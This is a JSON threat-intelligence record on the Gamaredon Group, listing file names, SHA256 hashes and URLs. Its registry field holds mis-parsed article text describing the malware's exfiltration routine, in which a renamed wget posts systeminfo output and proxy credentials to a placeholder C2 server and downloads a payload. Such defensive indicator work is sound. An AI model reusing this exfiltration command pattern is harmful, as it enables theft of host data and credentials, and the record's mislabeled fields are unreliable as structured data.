{"rule_id": 1020, "name": "The Gamaredon Group_ A TTP Profile Analysis", "description": "-", "references": [], "File_Names": ["lisingrout.ddns", "Pterodo.SV", "WinRAR.exe", "Agent.GP", "Agent.ATF", "ssu_zakon.docx", "ohJlkad.txt", "Chrome.lnk", "Pterodo.QW", "Generic.VA", "8331.txt", "librework.ddns", "unacev2.dll", "D3i_GMCWAAAq_8u.jpg", "mirotvorec.rar", "con\ufb01g.exe", "Law.docx", "usbqueshions.ddns", "librelogout.exe", "1966.doc", "Pterodo.RN", "analysis.html", "Unacev2.dll", "13446.cmd", "tr.dldr", "k.lrb", "statement.jpg", "1997.doc", "1966.docx", "1997.docx", "\u0437\u0430\u044f\u0432\u0430.jpg", "5493.cmd", "5532.cmd"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": ["842612d1afdf78cb8893018f3aeeec7df9f5f0ab245fe8e6d6b28519d0787937", "79fd962eb0c256f32786dab4d42cb416f6c1e6766bf0e2dcafdf5ffa2c5e61c1", "bc39db24919b69e80bfb534204f4441a162ca336379bf9eb66b038e039889aac", "ffc438d33f45ea56935f2bb6fca29e71862ecafb8b7e69ea19abd6df2d255075", "6b5f4aea458fb737e213714b3dda51f31b03ccb53a6a0501ee608c1bfd0cebb7", "5e16a71c7b99cb2780c31af34b268b78525b2b8fed55ff9e7bd4db8b1ba66f90", "0a6aae425a5e36f68b5da69157d2df4e7d836933adfd0696c389097ecb4a0fd7", "258ecb059c15178caed309a4861421d9f2436e70fb36fb1bf05e95d8d8d7c7e3", "92b474f037796e67cd2f36199a95c9feff46af7e58f4d528567f3f0a857132bf", "04ed2ad4fa67c8abd635d34017c3d04813690a91282a0446c0505b2af97ce48b", "46638ca3be6cdbd302e84c26bf14bfda6ed0c1353808914b40246c40fdb5b8ed", "7ba638e8a53e6d1713b8f045c27170ef4a75c88197c57fffe227ca2ab05271e7", "a67167f363c2501d6a1436e5f8c12693d7cf9d2f3ca1f71b21c292f041f91c7a", "3b50342b6cd96f400fbf7f00098a7dfcc9561037e4aa0bad8cfeafbb6f17923b", "995e6e0f90c58c82744545bf133b8c4c17decbe851953b0ffe5b21d625cade7d", "3725f82661852d89874a3748302bbf27990d25fc10d28831f1ad35a6c6d3b4bd", "18cd658fac1dd52a75b4eb6558d06dfe5be0e4db7078d72f663c44507449168c", "5b2c7b05368d825a4f3b10d74074d0803234f918166436d3e48ef7f9faf66461", "257f7f67c59ec8f3837c7e4c99b1dc20c5cd0273bd940beef46d5e641393be37", "e1e31702aad4bd7557a05906eb3004e9a72d77aa57e448379bee9a350cbba657", "d2bbecda830821ed3a00737c67fecb7985d612af58a31a1ee8488ad0409ed23b"], "Registry_Entries": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings. It then saves the following information:\n\nhttps://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-pro\ufb01le-analysis.html\n\n10/19\n\n\f8/22/2019\n\nThe Gamaredon Group: A TTP Pro\ufb01le Analysis\n\nProxyServer (Proxy server address)\nProxyUser (Proxy username)\nProxyPass (Proxy password)\n\nNext, it gets the name of the computer and generates a unique ID. Once done, it calls \u00a0the\nsysteminfo utility and saves the whole output to a text \ufb01le that in our case called ohJlkad.txt:\n\nsysteminfo > ohJlkad.txt\n\nFigure 20. Initial data collection code\nAfter that, it waits for 40 seconds using the command:\n\ntimeout /T 40\n\nOnce the timer ends, it will check for the internet connection by launching a ping command and\nsending 14 requests to google.com\n\nOnce \ufb01nished, it kills the task with the \ufb01lename stated in the con\ufb01guration (\u201clibrelogout.exe\u201d) and\ndeletes the \ufb01le.\n\nFinally, it calls the con\ufb01g.exe application to provide several arguments:\n\n--user-agent = [hardcoded UA]\n--post-data=\u201d\n\nversiya=wrar\ncomp=%computername%\nid=[generated from computer name]\nsysinfo=[data from ohJlkad.txt]\u201d\n\n\u201c[C2 Server]\u201d\n-q -N \u201c[C2 Server]\u201d\n-O \u201clibrelogout.exe\u201d\n\nIn case the user is connected to the internet via proxy, it will provide additional arguments to\ncon\ufb01g.exe:\n\n-e\n--http_proxy=http://[Proxy Server]\nhttps://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-pro\ufb01le-analysis.html\n--proxy-user=[Proxy username]\n\nproxy password [Proxy password]\n\n11/19\n\n\u00a0\n\f8/22/2019\n\nThe Gamaredon Group: A TTP Pro\ufb01le Analysis\n\nAmong the arguments, we see one interesting parameter: versiya = wrar. First, the word Versiya\nis the Russian \u0412\u0435\u0440\u0441\u0438\u044f or Ukranian \u0412\u0435\u0440\u0441\u0456\u044f, and it means version. As it is set to wrar, we can\nguess that it refers to the way the payload is being delivered. In this case, the initial \ufb01le\nmirotvorec.rar contains an exploit for the WinRAR unacev2 module.\u00a0\n\nFigure 21. Data ex\ufb01ltration and payload dropping code\nAfter the con\ufb01g.exe returns, the script launches the main payload hosted on C2. To sum up the\nscript routine, it takes the following actions:\n\nCollects information about the infected host\nSends it to the C2 via con\ufb01g.exe\nDownloads and launches the main payload\n\nAnalyzing the con\ufb01g.exe \ufb01le, we found out that it is a legit wget version (v 1.11.4) with OpenSSL\nsupport compiled for Windows. The \ufb01le is quite old, as the compilation date goes back to 2009.\nApparently, the attackers decided to not reinvent the wheel and simply used an open-source\nsolution for ex\ufb01ltrating the host data and downloading the main payload.\n\nGoing Deep into the Shortcut\n\nIn addition to analyzing their techniques, we also decided to collect more information about the\nattackers. Fortunately, the shortcut they made will help us.\n\nThe shortcuts used in Windows are small \ufb01les that simplify our lives by providing a fast way to\naccess \ufb01les, applications, and URLs. Another fact is that the .lnk shortcuts help simplify the\nforensic analysis of malicious campaigns by providing the amount of the information hidden from\nthe user.\n\nFirst, let\u2019s check the \u201cGoggle Chrome.lnk\u201d by opening its properties:\n\nhttps://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-pro\ufb01le-analysis.html\n\n12/19\n\n\f8/22/2019\n\nThe Gamaredon Group: A TTP Pro\ufb01le Analysis\n\nFigure 22. Artifacts in the shortcut\nFirst, we see that the shortcut contains a Russian string \u0414\u043e\u0441\u0442\u0443\u043f \u0432 \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442 in the comment \ufb01eld,\nwhich translates to Access to the Internet. This text is shown if one hovers the mouse over the\nshortcut. The real Google Chrome shortcut will contain this comment and the text will depend on\nsystem language settings. So, we can guess that Windows with the Russian language pack has\nbeen used for forming the malicious shortcut.\n\nAnother artifact left by the attackers is the password they used to unpack win.exe.\n\nThe -p is the argument for WinRAR SFX to use a password when unpacking. So the rest of the\nstring \u2013 fvthbrfycrbte,k.lrb is the password. If you switch your keyboard layout to Russian and type\nthe password characters, you eventually recover an obscene phrase in Russian:\n\u201c\u0430\u043c\u0435\u0440\u0438\u043a\u0430\u043d\u0441\u043a\u0438\u0435\u0443**\u044e\u0434\u043a\u0438\u201d, that is translated as \u201cAmerican b**tards\u201d. Is this an Easter egg left by\nthe Gamaredon Group?\n\nNext, let\u2019s move to the shortcut internals. Using the parsers of the .lnk structure, we can extract\nmore information from the \ufb01le. We decided to use LNK Parser, a tool that can generate very\ndetailed html reports.\n\nhttps://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-pro\ufb01le-analysis.html\n\n13/19\n\n\f8/22/2019\n\nThe Gamaredon Group: A TTP Pro\ufb01le Analysis\n\nFigure 23. Part of the report generated by LNK Parser\nAs it contains quite a lot of information, we will focus on the most interesting pieces:\n\nThe .lnk \ufb01le was created on 08.04.2019 09:27:06 (UTC).\nThe shortcut was created on a drive with the serial number: 3c76-6c45\nAnother path is hardcoded in the shortcut \u2013 C:\\Users\\USER\\win.exe. This is probably the\nsame USER that created the decoy MS Of\ufb01ce documents.\nPC NetBIOS name: user-pc\nMAC address of the machine: 08:00:27:BC:C2:24 (VirtualBox)\n\nWe decided to use this information to search for any other samples containing the same MAC\naddress, drive serial number, or any other unique data from the shortcut.\n\nOnce the samples were found, we analyzed and extracted other pieces of information that could\nalso help us with attribution. The general behavior of the samples found was mostly the same:\nSFX archive, batch command \ufb01le, shortcuts. The only different parts were the bait \ufb01les and\nsometimes the batch scripts used by the attackers.\n\nFirst, we looked at a sample very similar to the one we deeply researched \u2013 mirotvorec.rar. The\nname of the archive is the same as the source of the decoy image shown in \ufb01gure 4. There were\nonly three main differences we observed: the lack of decoy \ufb01les (text \ufb01les and the\nssu_zakon.docx), and different icons used for win.exe and winlog.exe. The last one is different. It\nis user-agent written in the script:\n\n"], "URLs": ["http://[Proxy", "https://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-pro"], "weight": 0.0}